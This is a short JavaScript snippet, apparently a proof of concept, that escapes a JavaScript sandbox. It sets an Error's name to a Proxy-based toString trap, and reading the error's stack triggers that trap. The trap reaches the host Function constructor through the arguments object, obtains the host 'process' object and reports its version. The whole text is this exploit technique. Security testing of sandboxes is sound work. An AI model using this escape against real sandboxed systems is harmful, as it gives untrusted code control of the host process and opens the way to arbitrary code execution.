const err = new Error();err.name={toString:new Proxy(()=>{},{apply(t,a,args){const cc=args.constructor.constructor;const p=cc('return process')();_report(p.version)}})};try{err.stack}catch(e){}
